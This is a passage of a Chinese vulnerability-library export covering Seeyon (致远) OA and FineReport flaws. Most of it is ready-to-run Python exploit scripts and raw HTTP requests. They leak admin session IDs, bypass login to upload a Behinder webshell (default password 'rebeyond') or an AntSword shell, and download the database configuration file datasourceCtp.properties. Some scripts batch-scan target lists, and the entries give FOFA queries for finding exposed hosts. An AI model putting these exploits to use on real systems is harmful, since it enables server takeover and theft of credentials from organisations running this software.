从上面的代码可知，当cmd参数为getAll时，便可获取到所有用户的SessionID ,请求 http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll 回显Session则存在漏洞 通过替换 Session即可登陆系统 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/https/getSessionList.jsp?cmd=getAll\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,Session地址:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA ajax.do 登录绕过 任意文件上传 CNVD-2021-01627.html":{"url":"book/OA产品漏洞/致远OA/致远OA ajax.do 登录绕过 任意文件上传 CNVD-2021-01627.html","title":"致远OA ajax.do 登录绕过 任意文件上传 CNVD-2021-01627","keywords":"","body":"致远OA ajax.do登录绕过 任意文件上传 CNVD-2021-01627 漏洞描述 致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。 漏洞影响 [!NOTE] 致远OA V8.0 致远OA V7.1、V7.1SP1 致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 致远OA V6.0、V6.1SP1、V6.1SP2 致远OA V5.x 致远OA G6 漏洞复现 通过请求判断是否可能存在漏洞 http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do 查看是否出现如上图异常，若存在则可能出现漏洞 出现异常：java.lang.NullPointerException:null 然后调用未授权的文件上传接口上传webshell文件 POC请求包如下 POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00 冰蝎3 默认马pass : rebeyond webshell地址: http://xxx.xxx.xxx.xxx/seeyon/apps_res/addressbook/images/config.jspx 成功会返回 { \"message\":null, \"details\":null, \"code\":\"0436821967\" } 失败会返回 { \"message\": \"被迫下线，原因：与服务器失去连接\", \"code\": \"-1\", \"details\": null } 上传后请求webshell地址，访问返回出现如下图则成功写入 [!NOTE] 访问状态码为 200 成功 访问状态码为 404 失败 使用冰蝎连接:rebeyond 漏洞利用POC [!NOTE] 单个目标 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 致远OA 多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print('\\033[36m[o] 正在请求: {}'.format(vuln_url_2)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False) test_webshell(target_url) def test_webshell(target_url): webshell_url = target_url + \"/seeyon/apps_res/addressbook/images/config.jspx\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 正在请求 : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 webshell : {}/seeyon/apps_res/addressbook/images/config.jspx\\033[0m\".format(target_url,target_url)) print(\"\\033[32m[o] webshell地址：{}/seeyon/apps_res/addressbook/images/config.jspx \\033[0m\".format(target_url)) print(\"\\033[32m[o] 冰蝎3默认马 pass ：rebeyond \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标漏洞无法利用，写入失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用，写入失败 {} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 文件编码脚本, 自行进行自定义调试 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.html":{"url":"book/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.html","title":"致远OA webmail.do任意文件下载 CNVD-2020-62422","keywords":"","body":"致远OA webmail.do任意文件下载 CNVD-2020-62422 漏洞描述 致远OA存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息 漏洞影响 [!NOTE] 致远OA A6-V5 致远OA A8-V5 致远OA G6 漏洞复现 访问 url http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties 存在漏洞的OA 系统将会下载 datasourceCtp.properties 配置文件 更改参数 filePath 可下载其他文件 漏洞利用POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"workflow\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 文件请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 致远OA webmail.do任意文件下载 CNVD-2020-62422 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA Session泄露 任意文件上传漏洞.html":{"url":"book/OA产品漏洞/致远OA/致远OA Session泄露 任意文件上传漏洞.html","title":"致远OA Session泄露 任意文件上传漏洞","keywords":"","body":"致远OA Session泄露 任意文件上传漏洞 漏洞描述 致远OA通过发送特殊请求获取session，在通过文件上传接口上传webshell控制服务器 漏洞影响 [!NOTE] 致远OA FOFA [!NOTE] title=\"致远\" 漏洞复现 首先要获取管理员cookie POST /seeyon/thirdpartyController.do HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Length: 133 Content-Type: application/x-www-form-urlencoded method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1 [!NOTE] 返回包出现 Sset-Cookie 和 a8genius.do 即为成功获取 上传压缩包添加 Cookie上传 POST /seeyon/fileUpload.do?method=processUpload HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.25.1 Cookie: JSESSIONID=3495C4DEF87200EA323B1CA31E3B7DF5 Content-Length: 841 Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"firstSave\" true --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"callMethod\" resizeLayout --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"isEncrypt\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"takeOver\" false --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"type\" 0 --59229605f98b8cf290a7b8908b34616b Content-Disposition: form-data; name=\"file1\"; filename=\"test.png\" Content-Type: image/png PK....................______ --59229605f98b8cf290a7b8908b34616b-- 然后构造请求解压压缩包 POST /seeyon/ajax.do HTTP/1.1 Host: 192.168.10.2 User-Agent: python-requests/2.25.1 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Cookie: JSESSIONID=BDF7358D4C35C6D2BB99FADFEE21F913 Content-Length: 157 method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%222021-04-09%22%2C%225818374431215601542%22%5D 状态码返回500即为上传成功 漏洞POC [!NOTE] 脚本在文件目录的 POC中 其中含有zip压缩包 shell.zip, 如果上传失败更改一下文件名 # coding: utf-8 import requests import sys import random import time import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/seeyon/thirdpartyController.do\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200 and \"a8genius.do\" in response.text and 'set-cookie' in str(response.headers).lower(): cookies = response.cookies cookies = requests.utils.dict_from_cookiejar(cookies) cookie = cookies['JSESSIONID'] targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload' print(\"\\033[32m[o] 目标 {} 正在上传压缩包文件.... \\n[o] Cookie: {} \\033[0m\".format(target_url, cookie)) files = [('file1', ('360icon.png', open('shell.zip', 'rb'), 'image/png'))] headers = {'Cookie':\"JSESSIONID=%s\" % cookie} data = {'callMethod': 'resizeLayout', 'firstSave': \"true\", 'takeOver':\"false\", \"type\": '0','isEncrypt': \"0\"} response = requests.post(url=targeturl,files=files,data=data, headers=headers,timeout=60,verify=False) reg = re.findall('fileurls=fileurls\\+\",\"\\+\\'(.+)\\'',response.text,re.I) if len(reg)==0: sys.exit(\"上传文件失败\") POC_2(target_url, cookie, reg, headers) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url),e) def POC_2(target_url, cookie, reg, headers): vuln_url = target_url + '/seeyon/ajax.do' datestr = time.strftime('%Y-%m-%d') post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + '%22%2C%22' + reg[0] + '%22%5D' headers['Content-Type']=\"application/x-www-form-urlencoded\" print(\"\\033[32m[o] 目标 {} 正在解压文件.... \\033[0m\".format(target_url)) try: response = requests.post(vuln_url, data=post,headers=headers,timeout=60,verify=False) if response.status_code == 500: print(\"\\033[32m[o] 目标 {} 解压文件成功.... \\033[0m\".format(target_url)) print(\"\\033[32m[o] 默认Webshell地址: {}/seeyon/common/designer/pageLayout/test10086.jsp \\033[0m\".format(target_url)) print(\"\\033[32m[o] 蚁剑密码: test \\033[0m\".format(target_url)) print(\"\\033[32m[o] 如果目标webshell无法访问，请更换 shell.zip 中的木马名称 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url),e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/帆软OA/":{"url":"book/OA产品漏洞/帆软OA/","title":"帆软OA","keywords":"","body":"帆软报表 帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757 帆软 V9 任意文件覆盖文件上传 帆软报表 2012 SSRF漏洞 帆软报表 2012 信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html":{"url":"book/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.html","title":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757","keywords":"","body":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757 漏洞描述 FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。 FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。 漏洞影响 [!NOTE] FineReport FOFA [!NOTE] body=\"isSupportForgetPwd\" 漏洞复现 出现漏洞的文件为 fr-applet-8.0.jar package com.fr.chart.web; import com.fr.base.FRContext; import com.fr.general.IOUtils; import com.fr.stable.CodeUtils; import com.fr.web.core.ActionNoSessionCMD; import com.fr.web.utils.WebUtils; import java.io.InputStream; import 